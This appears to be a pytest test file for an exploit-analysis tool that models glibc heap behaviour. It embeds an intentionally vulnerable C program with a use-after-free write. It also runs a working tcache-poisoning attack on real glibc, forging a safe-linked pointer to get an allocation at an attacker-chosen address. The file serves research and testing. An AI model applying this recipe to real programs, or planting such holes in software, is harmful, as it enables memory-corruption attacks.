"""Phase 9 (frontier) — heap-layout primitives: glibc tcache model + tcache poisoning."""
from __future__ import annotations

import os
import re
import select
import subprocess

import pytest
from lykos.analyze.dynamic import sandbox
from lykos.analyze.poc import heap

# tcache playground: drive malloc/free and a UAF fd-write via stdin; print chunk addresses.
_PLAY = r"""
#include <stdio.h>
#include <stdlib.h>
static void* chunks[64];
char win_target[64] __attribute__((aligned(16)));
int main(void){
  setvbuf(stdout,NULL,_IONBF,0);
  char line[128];
  printf("win_target=%p\n",(void*)win_target);
  while(fgets(line,sizeof line,stdin)){
    char op; unsigned idx; unsigned long a,b;
    if(sscanf(line," %c",&op)!=1) continue;
    if(op=='a'){ sscanf(line," a %lu %u",&a,&idx); chunks[idx]=malloc(a);
                 printf("alloc[%u]=%p\n",idx,chunks[idx]); }
    else if(op=='f'){ sscanf(line," f %u",&idx); free(chunks[idx]); }
    else if(op=='w'){ sscanf(line," w %u %lx",&idx,&b); *(unsigned long*)chunks[idx]=b; }
    else if(op=='q'){ break; }
  }
  return 0;
}
"""


def test_request2size_and_index():
    assert heap.request2size(24) == 0x20 and heap.request2size(0x18) == 0x20
    assert heap.request2size(40) == 0x30 and heap.request2size(0) == 0x20
    assert heap.tcache_index(0x20) == 0 and heap.tcache_index(0x30) == 1
    assert heap.in_tcache_range(0x20) and not heap.in_tcache_range(0x800)


def test_safe_linking_roundtrip():
    a, target = 0x556417f13320, 0x55640be0d060
    assert heap.demangle(a, heap.mangle(a, target)) == target
    assert heap.mangle(a, target) != target            # actually mangled


def test_model_lifo_reuse():
    m = heap.TcacheModel(base=0x10000)
    a = m.malloc(24); b = m.malloc(24)
    assert b != a
    m.free(b); m.free(a)                                # tcache head = a (LIFO)
    assert m.malloc(24) == a                            # last freed comes back first
    assert m.malloc(24) == b


def test_model_tcache_poison_returns_target():
    m = heap.TcacheModel(base=0x10000)
    a = m.malloc(24); b = m.malloc(24)
    m.free(b); m.free(a)
    m.write_fd(a, 0xCAFEF00D000)                        # UAF: forge A's fd -> target
    assert m.malloc(24) == a
    assert m.malloc(24) == 0xCAFEF00D000                # arbitrary allocation


def test_poison_recipe_shape():
    r = heap.tcache_poison_recipe(24)
    assert r["ok"] and r["chunk_size"] == 0x20
    ops = [o[0] for o in r["ops"]]
    assert ops == ["alloc", "alloc", "free", "free", "write_fd", "alloc", "alloc"]
    assert r["mangle"] is heap.mangle


# --------------------------------------------------------- live: real glibc tcache poison
@pytest.fixture
def play_bin(gcc, tmp_path_factory):
    if sandbox.host_arch() != "x86-64":
        pytest.skip("tcache poisoning test is x86-64 native only")
    d = tmp_path_factory.mktemp("heap")
    c = d / "h.c"; c.write_text(_PLAY)
    out = d / "h"
    if subprocess.run([gcc, "-O0", str(c), "-o", str(out)], capture_output=True).returncode != 0:
        pytest.skip("cannot build heap playground")
    return out


def _drive(p, data):
    p.stdin.write(data); p.stdin.flush()
    out = b""
    while select.select([p.stdout], [], [], 0.4)[0]:
        c = os.read(p.stdout.fileno(), 4096)
        if not c:
            break
        out += c
    return out.decode("latin-1", "ignore")


def test_tcache_poison_on_real_glibc(play_bin):
    """Lykos's model computes the safe-linking mangle + recipe; verify the poisoned allocation
    actually returns the attacker-chosen address on the host's real glibc."""
    p = subprocess.Popen([str(play_bin)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    try:
        banner = _drive(p, b"")
        win = int(re.search(r"win_target=0x([0-9a-f]+)", banner).group(1), 16)
        a0 = int(re.search(r"alloc\[0\]=0x([0-9a-f]+)", _drive(p, b"a 24 0\n")).group(1), 16)
        mangled = heap.mangle(a0, win)                 # the model's safe-linked fd value
        _drive(p, b"a 24 1\nf 1\nf 0\n")               # per the recipe (LIFO head -> chunk 0)
        _drive(p, ("w 0 %x\n" % mangled).encode())     # UAF: forge chunk0.fd -> win_target
        out = _drive(p, b"a 24 2\na 24 3\n")           # alloc -> chunk0 ; alloc -> win_target
        got = int(re.search(r"alloc\[3\]=0x([0-9a-f]+)", out).group(1), 16)
        assert got == win                              # arbitrary allocation achieved
    finally:
        try:
            p.stdin.write(b"q\n"); p.stdin.flush()
            p.wait(timeout=3)
        except Exception:
            p.kill()


# ------------------------------------------------------- automatic layout search (MAZE-style)
from lykos.analyze.poc import heap_search as hs  # noqa: E402


def test_search_reclaim_depth_matches_lifo():
    st, addrs = hs.prime([24, 24, 24])                 # freed c0,c1,c2 (LIFO head=c2)
    assert len(hs.search(st, hs.reclaim_goal(addrs[2]), sizes=(24,))) == 1   # head
    assert len(hs.search(st, hs.reclaim_goal(addrs[1]), sizes=(24,))) == 2
    assert len(hs.search(st, hs.reclaim_goal(addrs[0]), sizes=(24,))) == 3   # deepest


def test_search_adjacency_and_unreachable():
    ops = hs.search(hs.HeapState(top=0x1000), hs.adjacency_goal(24), sizes=(24,))
    assert ops == [("alloc", 24), ("alloc", 24)]
    st, _ = hs.prime([24, 24, 24])
    assert hs.search(st, hs.reclaim_goal(0xDEAD0000), sizes=(24,), max_steps=6) is None


def test_plan_reclaim_returns_ops():
    ops, addrs = hs.plan_reclaim([24, 24, 24], target_index=1)
    assert len(ops) == 2 and all(o[0] == "alloc" for o in ops)


def test_layout_search_verified_on_real_glibc(play_bin):
    """The search finds how many allocations reclaim a chosen freed chunk; verify the Nth
    allocation actually returns that chunk's address on the host's real glibc."""
    p = subprocess.Popen([str(play_bin)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    try:
        _drive(p, b"")                                 # banner
        out = _drive(p, b"a 24 0\na 24 1\na 24 2\n")
        addrs = [int(x, 16) for x in re.findall(r"alloc\[\d\]=0x([0-9a-f]+)", out)]
        _drive(p, b"f 0\nf 1\nf 2\n")                  # free in order -> LIFO head = c2
        # search: reclaim the middle chunk (c1, freed 2nd) -> should take 2 allocations
        ops, _model = hs.plan_reclaim([24, 24, 24], target_index=1)
        assert len(ops) == 2
        out2 = _drive(p, b"a 24 3\na 24 4\n")          # run the planned allocations
        got = int(re.search(r"alloc\[4\]=0x([0-9a-f]+)", out2).group(1), 16)
        assert got == addrs[1]                         # the 2nd alloc reclaimed c1
    finally:
        try:
            p.stdin.write(b"q\n"); p.stdin.flush(); p.wait(timeout=3)
        except Exception:
            p.kill()


# ------------------------------------------------- non-tcache bins: fastbin + small-bin order
def test_bin_class_helpers():
    assert heap.is_fastbin(0x20) and heap.is_fastbin(0x80) and not heap.is_fastbin(0x90)
    assert heap.is_smallbin(0x100) and heap.is_smallbin(0x3f0) and not heap.is_smallbin(0x400)


def test_model_fastbin_overflow_lifo():
    m = heap.TcacheModel(base=0x10000)
    c = [m.malloc(24) for _ in range(9)]               # chunk 0x20 (tcache + fastbin)
    for x in c:
        m.free(x)                                      # 0..6 -> tcache, 7,8 -> fastbin
    order = [m.malloc(24) for _ in range(9)]
    idx = {v: i for i, v in enumerate(c)}
    assert [idx[a] for a in order] == [6, 5, 4, 3, 2, 1, 0, 8, 7]   # tcache LIFO, fastbin LIFO


def test_model_smallbin_overflow_fifo():
    m = heap.TcacheModel(base=0x10000)
    c = [m.malloc(0xf8) for _ in range(9)]             # chunk 0x100 (tcache, NOT fastbin)
    for x in c:
        m.free(x)                                      # 0..6 -> tcache, 7,8 -> small bin
    order = [m.malloc(0xf8) for _ in range(9)]
    idx = {v: i for i, v in enumerate(c)}
    assert [idx[a] for a in order] == [6, 5, 4, 3, 2, 1, 0, 7, 8]   # tcache LIFO, small FIFO


def test_fastbin_overflow_matches_real_glibc(play_bin):
    """Free 9 same-size chunks; the model predicts tcache-LIFO then fastbin-LIFO reuse -- verify
    the exact order on the host's real glibc."""
    p = subprocess.Popen([str(play_bin)], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    try:
        _drive(p, b"")
        allocs = "".join("a 24 %d\n" % i for i in range(9))
        out = _drive(p, allocs.encode())
        orig = [int(a, 16) for a in re.findall(r"alloc\[\d+\]=0x([0-9a-f]+)", out)]
        _drive(p, "".join("f %d\n" % i for i in range(9)).encode())
        out2 = _drive(p, "".join("a 24 %d\n" % (20 + i) for i in range(9)).encode())
        got = [int(a, 16) for a in re.findall(r"alloc\[\d+\]=0x([0-9a-f]+)", out2)]
        idx = {v: i for i, v in enumerate(orig)}
        real = [idx[a] for a in got]

        m = heap.TcacheModel(base=0x10000)
        cm = [m.malloc(24) for _ in range(9)]
        for x in cm:
            m.free(x)
        mi = {v: i for i, v in enumerate(cm)}
        model = [mi[m.malloc(24)] for _ in range(9)]
        assert real == model == [6, 5, 4, 3, 2, 1, 0, 8, 7]     # model predicts real glibc
    finally:
        try:
            p.stdin.write(b"q\n"); p.stdin.flush(); p.wait(timeout=3)
        except Exception:
            p.kill()
